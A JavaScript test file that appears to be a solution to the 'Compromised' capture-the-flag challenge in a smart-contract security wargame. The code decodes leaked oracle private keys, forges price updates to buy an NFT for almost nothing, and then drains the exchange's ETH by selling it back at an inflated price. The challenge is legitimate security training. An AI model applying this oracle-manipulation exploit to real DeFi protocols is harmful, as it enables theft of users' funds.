const {
  balance,
  time,
  constants,
  ether,
  BN,
} = require("@openzeppelin/test-helpers");

const { accounts, contract, web3 } = require("@openzeppelin/test-environment");

const Exchange = contract.fromArtifact("Exchange");
const TrustfulOracle = contract.fromArtifact("TrustfulOracle");
const TrustfulOracleInitializer = contract.fromArtifact(
  "TrustfulOracleInitializer"
);
const DamnValuableNFT = contract.fromArtifact("DamnValuableNFT");

const { expect } = require("chai");

describe("Compromised challenge", function () {
  const [deployer, attacker, ...otherAccount] = accounts;

  const EXCHANGE_INITIAL_ETH_BALANCE = ether("9990");
  const INITIAL_NFT_PRICE = ether("999");

  const sources = [
    "0xA73209FB1a42495120166736362A1DfA9F95A105",
    "0xe92401A4d3af5E446d93D11EEc806b1462b39D15",
    "0x81A5D6E50C214044bE44cA0CB057fe119097850c",
  ];
  const symbol = "DVNFT";

  const symbols = [symbol, symbol, symbol];

  const initialPrices = [
    INITIAL_NFT_PRICE,
    INITIAL_NFT_PRICE,
    INITIAL_NFT_PRICE,
  ];

  before(async function () {
    this.initializer = await TrustfulOracleInitializer.new(
      sources,
      symbols,
      initialPrices,
      { from: deployer }
    );

    this.oracle = await TrustfulOracle.at(await this.initializer.oracle(), {
      from: deployer,
    });

    this.exchange = await Exchange.new(this.oracle.address, {
      from: deployer,
      value: EXCHANGE_INITIAL_ETH_BALANCE,
    });

    this.dvNFT = await DamnValuableNFT.at(await this.exchange.token(), {
      from: deployer,
    });

    expect(await balance.current(this.exchange.address)).to.be.bignumber.eq(
      EXCHANGE_INITIAL_ETH_BALANCE
    );

    expect(await this.oracle.getMedianPrice(symbol)).to.be.bignumber.eq(
      INITIAL_NFT_PRICE
    );

    expect(await this.oracle.getNumberOfSources()).to.be.bignumber.eq("3");
  });

  it("Exploit compromised", async function () {
    const compromisedKeys = [
      "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35",

      "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34",
    ];
    const hexToBase64 = compromisedKeys.map((key) =>
      Buffer.from(key.split(` `).join(``), `hex`).toString(`utf8`)
    );

    console.log(`hex to Base64 keys : ${hexToBase64[0]}, ${hexToBase64[1]}`);

    const base64ToStringAddress = hexToBase64.map((key) =>
      Buffer.from(key, `base64`).toString(`utf8`)
    );
    const leakedAccounts = base64ToStringAddress.map((privateKey) => {
      return web3.eth.accounts.privateKeyToAccount(privateKey);
    });

    console.log(
      `Base64 to StringAddress : ${base64ToStringAddress[0]}, ${base64ToStringAddress[1]}`
    );

    const postPriceABI = {
      name: `postPrice`,
      type: `function`,
      inputs: [
        {
          type: `string`,
          name: `symbol`,
        },
        {
          type: `uint256`,
          name: `newPrice`,
        },
      ],
    };

    const postPrice = async (price) => {
      const postPriceInputs = [symbol, price];

      const transactionData = web3.eth.abi.encodeFunctionCall(
        postPriceABI,
        postPriceInputs
      );

      const transaction = {
        to: this.oracle.address,
        gas: 1e5,
        data: transactionData,
      };

      const signTxs = await Promise.all(
        leakedAccounts.map((pvkey) => {
          return pvkey.signTransaction(transaction);
        })
      );

      return Promise.all(
        signTxs.map((signTx) => {
          web3.eth.sendSignedTransaction(signTx.rawTransaction);
        })
      );
    };

    // we reduce price to buy it at a very low price
    const newPrice = ether("0.01");
    await postPrice(newPrice);

    expect(await this.oracle.getMedianPrice(symbol)).to.be.bignumber.eq(
      newPrice
    );

    // tokenId would be zero
    const tokenId = await this.exchange.buyOne({
      from: attacker,
      value: newPrice,
    });

    await this.dvNFT.approve(this.exchange.address, 0, {
      from: attacker,
    });

    await postPrice(EXCHANGE_INITIAL_ETH_BALANCE);

    expect(await this.oracle.getMedianPrice(symbol)).to.be.bignumber.eq(
      EXCHANGE_INITIAL_ETH_BALANCE
    );

    await this.exchange.sellOne(0, { from: attacker });
  });

  after(async function () {
    expect(await balance.current(attacker)).to.be.bignumber.gt(
      EXCHANGE_INITIAL_ETH_BALANCE
    );

    expect(await balance.current(this.exchange.address)).to.be.bignumber.eq(
      ether("0.01")
    );
  });
});
